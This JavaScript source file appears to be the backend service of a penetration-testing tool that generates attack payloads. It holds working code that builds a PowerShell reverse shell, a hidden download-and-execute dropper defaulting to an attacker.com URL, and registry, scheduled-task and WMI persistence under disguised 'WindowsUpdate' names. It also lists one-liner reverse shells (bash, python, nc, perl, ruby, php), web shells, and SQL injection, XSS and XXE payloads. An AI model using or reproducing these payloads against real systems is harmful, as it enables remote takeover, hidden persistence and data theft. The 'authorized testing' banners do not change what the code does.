import { logger } from '../config/logger.js';
import { AppError } from '../middleware/errorHandler.js';
import crypto from 'crypto';

export class ExploitationService {
  
  buildPowerShellReverseShell(lhost, lport, options = {}) {
    const script = `# PowerShell Reverse Shell
# Generated: ${new Date().toISOString()}
# Target: ${lhost}:${lport}
# WARNING: FOR AUTHORIZED TESTING ONLY

# Configuration
$LHOST = "${lhost}"
$LPORT = ${lport}

# Function to establish reverse shell connection
function Invoke-ReverseShell {
    param(
        [string]$Host,
        [int]$Port
    )
    
    try {
        # Create TCP client
        $client = New-Object System.Net.Sockets.TCPClient($Host, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $buffer = New-Object System.Byte[] 2048
        $encoding = New-Object System.Text.AsciiEncoding
        
        # Send initial banner
        $writer.WriteLine("PowerShell Reverse Shell")
        $writer.WriteLine("Target: $env:COMPUTERNAME")
        $writer.WriteLine("User: $env:USERNAME")
        $writer.WriteLine("PWD: $(Get-Location)")
        $writer.WriteLine("")
        $writer.Flush()
        
        # Main command loop
        while($true) {
            # Send prompt
            $writer.Write("PS $((Get-Location).Path)> ")
            $writer.Flush()
            
            # Read command from attacker
            $read = $null
            $bytes = $stream.Read($buffer, 0, $buffer.Length)
            if($bytes -le 0) { break }
            
            $read = $encoding.GetString($buffer, 0, $bytes)
            $read = $read.Trim()
            
            # Handle special commands
            if($read -eq "exit") { break }
            if([string]::IsNullOrEmpty($read)) { continue }
            
            # Execute command and capture output
            try {
                $output = Invoke-Expression $read 2>&1 | Out-String
                $writer.WriteLine($output)
            } catch {
                $writer.WriteLine("Error: $($_.Exception.Message)")
            }
            
            $writer.Flush()
        }
        
        # Cleanup
        $writer.Close()
        $client.Close()
        
    } catch {
        Write-Error "Connection failed: $($_.Exception.Message)"
    }
}

# Execute the reverse shell
Invoke-ReverseShell -Host $LHOST -Port $LPORT`;

    return script;
  }

  buildPowerShellDownloadExecute(url, options = {}) {
    const script = `# PowerShell Download & Execute
# Generated: ${new Date().toISOString()}
# URL: ${url}
# WARNING: FOR AUTHORIZED TESTING ONLY

$url = "${url}"
$output = "$env:TEMP\\payload_$(Get-Random).exe"

try {
    # Download file
    Write-Host "[+] Downloading payload from $url"
    $webClient = New-Object System.Net.WebClient
    ${options.proxy ? `$webClient.Proxy = New-Object System.Net.WebProxy("${options.proxy}")` : ''}
    $webClient.DownloadFile($url, $output)
    
    # Execute payload
    Write-Host "[+] Executing payload: $output"
    Start-Process -FilePath $output ${options.arguments ? `-ArgumentList "${options.arguments}"` : ''} ${options.hidden ? '-WindowStyle Hidden' : ''}
    
    # Optional: Delete after execution
    ${options.cleanup ? 'Start-Sleep -Seconds 5; Remove-Item -Path $output -Force' : ''}
    
    Write-Host "[+] Payload executed successfully"
} catch {
    Write-Error "Failed: $($_.Exception.Message)"
}`;

    return script;
  }

  buildPowerShellPersistence(method, options = {}) {
    const scripts = {
      registry: `# PowerShell Persistence via Registry
# Method: Registry Run Key
# WARNING: FOR AUTHORIZED TESTING ONLY

$payloadPath = "${options.payloadPath || 'C:\\Windows\\Temp\\payload.exe'}"
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$regName = "${options.name || 'WindowsUpdate'}"

try {
    # Add registry key
    Set-ItemProperty -Path $regPath -Name $regName -Value $payloadPath -Force
    Write-Host "[+] Persistence established via registry"
    Write-Host "[+] Key: $regPath\\$regName"
    Write-Host "[+] Value: $payloadPath"
} catch {
    Write-Error "Failed: $($_.Exception.Message)"
}`,

      scheduledTask: `# PowerShell Persistence via Scheduled Task
# Method: Scheduled Task
# WARNING: FOR AUTHORIZED TESTING ONLY

$taskName = "${options.taskName || 'WindowsUpdateCheck'}"
$payloadPath = "${options.payloadPath || 'C:\\Windows\\Temp\\payload.exe'}"
$trigger = "${options.trigger || 'AtLogon'}"

try {
    # Create scheduled task
    $action = New-ScheduledTaskAction -Execute $payloadPath
    
    switch($trigger) {
        "AtLogon" { $taskTrigger = New-ScheduledTaskTrigger -AtLogon }
        "AtStartup" { $taskTrigger = New-ScheduledTaskTrigger -AtStartup }
        "Daily" { $taskTrigger = New-ScheduledTaskTrigger -Daily -At 9am }
        default { $taskTrigger = New-ScheduledTaskTrigger -AtLogon }
    }
    
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $taskTrigger -Principal $principal -Settings $settings -Force
    
    Write-Host "[+] Persistence established via scheduled task"
    Write-Host "[+] Task Name: $taskName"
    Write-Host "[+] Trigger: $trigger"
} catch {
    Write-Error "Failed: $($_.Exception.Message)"
}`,

      wmi: `# PowerShell Persistence via WMI Event
# Method: WMI Event Subscription
# WARNING: FOR AUTHORIZED TESTING ONLY

$filterName = "${options.filterName || 'WindowsUpdateFilter'}"
$consumerName = "${options.consumerName || 'WindowsUpdateConsumer'}"
$payloadPath = "${options.payloadPath || 'C:\\Windows\\Temp\\payload.exe'}"

try {
    # Create WMI event filter (trigger on user logon)
    $filter = ([wmiclass]"\\\\localhost\\root\\subscription:__EventFilter").CreateInstance()
    $filter.QueryLanguage = "WQL"
    $filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
    $filter.Name = $filterName
    $filter.EventNamespace = "root\\cimv2"
    $filterResult = $filter.Put()
    
    # Create WMI event consumer
    $consumer = ([wmiclass]"\\\\localhost\\root\\subscription:CommandLineEventConsumer").CreateInstance()
    $consumer.Name = $consumerName
    $consumer.CommandLineTemplate = $payloadPath
    $consumerResult = $consumer.Put()
    
    # Bind filter to consumer
    $bind = ([wmiclass]"\\\\localhost\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
    $bind.Filter = $filterResult.Path
    $bind.Consumer = $consumerResult.Path
    $bind.Put()
    
    Write-Host "[+] WMI persistence established"
    Write-Host "[+] Filter: $filterName"
    Write-Host "[+] Consumer: $consumerName"
} catch {
    Write-Error "Failed: $($_.Exception.Message)"
}`
    };

    return scripts[method] || scripts.registry;
  }

  async generatePayload(type, options = {}) {
    try {
      logger.info(`Generating ${type} payload`);
      
      const lhost = options.lhost || '10.10.10.10';
      const lport = options.lport || 4444;
      
      let payload;
      let format = 'script';
      
      // PowerShell payloads - fully built scripts
      if (type === 'reverse-shell-powershell') {
        payload = this.buildPowerShellReverseShell(lhost, lport, options);
        format = 'powershell';
      } else if (type === 'powershell-download-execute') {
        payload = this.buildPowerShellDownloadExecute(options.url || 'http://attacker.com/payload.exe', options);
        format = 'powershell';
      } else if (type === 'powershell-persistence') {
        payload = this.buildPowerShellPersistence(options.method || 'registry', options);
        format = 'powershell';
      } else if (type === 'powershell-oneliner') {
        // Compact one-liner version
        payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
        format = 'commandline';
      } else {
        // Other payload types
        const payloads = {
          'reverse-shell-bash': `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
          'reverse-shell-python': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
          'reverse-shell-php': `<?php $sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3"); ?>`,
          'reverse-shell-nc': `nc -e /bin/sh ${lhost} ${lport}`,
          'reverse-shell-perl': `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
          'reverse-shell-ruby': `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
          'web-shell-php': `<?php system($_GET['cmd']); ?>`,
          'web-shell-jsp': `<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { out.println("<pre>"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } out.println("</pre>"); } %>`,
          'web-shell-aspx': `<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string cmd = Request["cmd"];Process p = new Process();p.StartInfo.FileName = "cmd.exe";p.StartInfo.Arguments = "/c " + cmd;p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.Start();string output = p.StandardOutput.ReadToEnd();Response.Write("<pre>" + output + "</pre>");%>`,
          'sql-injection-union': `' UNION SELECT NULL,NULL,NULL--`,
          'sql-injection-error': `' AND 1=CONVERT(int,(SELECT @@version))--`,
          'sql-injection-blind': `' AND 1=1--`,
          'xss-basic': `<script>alert('XSS')</script>`,
          'xss-img': `<img src=x onerror=alert('XSS')>`,
          'xss-svg': `<svg onload=alert('XSS')>`,
          'xxe-injection': `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
          'ldap-injection': `*)(uid=*))(|(uid=*`,
          'command-injection': `; whoami #`
        };

        payload = payloads[type];
        
        if (!payload) {
          throw new AppError(`Invalid payload type: ${type}. Available types: ${Object.keys(payloads).join(', ')}, powershell-*, etc.`, 400);
        }
      }

      return {
        type,
        payload,
        format,
        options,
        usage: format === 'powershell' ? 
          `Save as ${type}.ps1 and execute:\n  powershell -ExecutionPolicy Bypass -File ${type}.ps1\n\nOr copy and paste into PowerShell console.` :
          `Execute directly in terminal/shell`,
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY. Unauthorized use is illegal.'
      };
    } catch (error) {
      logger.error(`Payload generation failed: ${error.message}`);
      throw new AppError(`Payload generation failed: ${error.message}`, 500);
    }
  }

  async listExploits(category = 'all', platform = 'all') {
    try {
      logger.info(`Listing exploits: category=${category}, platform=${platform}`);
      
      // Mock exploit database
      const exploits = [
        {
          id: 'EXP-2024-001',
          name: 'Apache Log4j RCE',
          category: 'remote',
          platform: 'java',
          severity: 'CRITICAL',
          cve: 'CVE-2021-44228',
          description: 'Remote code execution via JNDI injection'
        },
        {
          id: 'EXP-2024-002',
          name: 'ProxyShell RCE',
          category: 'remote',
          platform: 'windows',
          severity: 'CRITICAL',
          cve: 'CVE-2021-34473',
          description: 'Microsoft Exchange Server RCE'
        },
        {
          id: 'EXP-2024-003',
          name: 'Dirty Pipe',
          category: 'local',
          platform: 'linux',
          severity: 'HIGH',
          cve: 'CVE-2022-0847',
          description: 'Linux kernel privilege escalation'
        }
      ];

      const filtered = exploits.filter(exp => {
        if (category !== 'all' && exp.category !== category) return false;
        if (platform !== 'all' && exp.platform !== platform) return false;
        return true;
      });

      return {
        category,
        platform,
        totalExploits: filtered.length,
        exploits: filtered,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      logger.error(`List exploits failed: ${error.message}`);
      throw new AppError(`Failed to list exploits: ${error.message}`, 500);
    }
  }

  async generateCustomExploit(target, vulnerability) {
    try {
      logger.info(`Generating custom exploit for ${target}`);
      
      const exploit = {
        target,
        vulnerability,
        exploitCode: `# Custom Exploit for ${vulnerability}\n# Target: ${target}\n# Generated: ${new Date().toISOString()}\n\nimport requests\n\ndef exploit():\n    # Add your exploit code here\n    pass\n\nif __name__ == "__main__":\n    exploit()`,
        timestamp: new Date().toISOString(),
        warning: 'FOR AUTHORIZED TESTING ONLY. Customize and test in controlled environment.'
      };

      return exploit;
    } catch (error) {
      logger.error(`Custom exploit generation failed: ${error.message}`);
      throw new AppError(`Custom exploit generation failed: ${error.message}`, 500);
    }
  }
}

export default new ExploitationService();
